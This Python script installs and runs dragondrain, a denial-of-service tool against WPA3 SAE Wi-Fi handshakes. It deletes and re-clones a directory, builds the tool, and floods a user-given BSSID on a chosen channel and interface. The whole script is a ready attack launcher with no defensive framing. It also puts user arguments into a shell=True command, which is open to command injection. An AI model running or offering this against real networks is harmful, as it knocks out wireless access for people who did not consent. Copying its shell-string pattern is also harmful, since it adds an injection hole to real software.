#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import argparse
import subprocess

# Define the file path to check
FILE_PATH = "/dragondrain/src/dragondrain"

# Define the commands to run if the file does not exist
INSTALL_COMMANDS = [
    "apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config",
    "rm -rf /dragondrain",
    "git clone https://github.com/vanhoefm/dragondrain-and-time.git /dragondrain",
    "cd /dragondrain && autoreconf -i",
    "cd /dragondrain && ./autogen.sh",
    "cd /dragondrain && ./configure",
    "sed -i '42s/ __packed//' /dragondrain/src/aircrack-osdep/radiotap/radiotap.h",
    "cd /dragondrain && make"
]

def check_and_install():
    if not os.path.exists(FILE_PATH):
        print(f"File {FILE_PATH} not found. Running installation commands...")
        for command in INSTALL_COMMANDS:
            subprocess.run(command, shell=True, check=True)

def run_final_command(bssid, channel, interface):
    # Dynamically generate the FINAL_COMMAND string with user-provided arguments
    final_command = f"/dragondrain/src/dragondrain -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"
    
    print(f"Running final command: {final_command}")
    subprocess.run(final_command, shell=True, check=True, input=b"\n")

def main():
    parser = argparse.ArgumentParser(description="Script to check file existence, install dependencies, and execute dragon drain command.")
    parser.add_argument("bssid", help="BSSID parameter")
    parser.add_argument("channel", help="Channel parameter")
    parser.add_argument("interface", help="Network interface parameter")

    args = parser.parse_args()

    print(f"Received parameters: BSSID={args.bssid}, Channel={args.channel}, Interface={args.interface}")

    check_and_install()
    run_final_command(args.bssid, args.channel, args.interface)

if __name__ == "__main__":
    main()
